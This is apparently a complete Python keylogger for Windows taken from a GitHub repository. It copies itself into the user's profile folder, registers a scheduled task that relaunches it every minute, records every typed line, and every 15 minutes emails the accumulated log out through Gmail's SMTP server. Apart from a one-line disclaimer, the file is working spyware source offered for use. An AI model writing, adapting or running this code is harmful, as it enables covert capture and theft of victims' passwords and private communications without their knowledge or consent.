#User is responsible for all uses of program. Not intended for any illegal use.
#https://github.com/ksmeeks0001/keylogger
import os
import getpass
import shutil
import keyboard
import smtplib
import time
class App():

    def __init__(self):

        self.user = getpass.getuser()
        #check if this script has been previously copied and scheduled
        if not os.access("C:\\Users\\" + self.user + "\\keylogger.py", os.F_OK): 
            
            self.copy()
            self.schedule()
        else:
            self.start_logger()
    
    def copy(self):
        #copy myself in case user deletes original download
        shutil.copyfile(os.getcwd() + '\\keylogger.py',
                    "C:\\Users\\" + self.user + "\\keylogger.py")
        
        


    def schedule(self):
        #use task schedule to ensure logger is running every minute

        os.system('schtasks /Create /SC MINUTE /TN logkeys /TR C:\\Users\\' + self.user + '\\keylogger.py')
            

    def start_logger(self):
        def get_log():
            """log/send/repeat"""
            now = time.time()
            file = open('log.txt', 'r+')
            while True: 
                log = keyboard.get_typed_strings(keyboard.record(until='enter'))
                file.write(next(log) + '\n')
                if now <= (time.time() - 900): #send every 15 mins
                    try:
                        file.seek(0) #back to start of file 
                        logged = file.read() #read in whole file
                        send(logged) #send it out
                        file.seek(0) #back to start of file and erase
                        file.truncate()
                        now = time.time() #reset the time variable
                    except: #if file was unable to be sent continue logging 
                        continue
            file.close()

        def send(logged):
            """"Send the key logs to email"""
            email = ''
            passw= ''
            obj = smtplib.SMTP ('smtp.gmail.com', 587)
            obj.ehlo()
            obj.starttls()
            obj.login(email, passw)
            obj.sendmail(email, email,
                     "Subject: \n" + str(logged))
            obj.quit()

        def main():
                    
            file = open('log.txt', 'w') #clear/create log file
            file.close()
            get_log() #start logging
    
        main()

        
run = App()
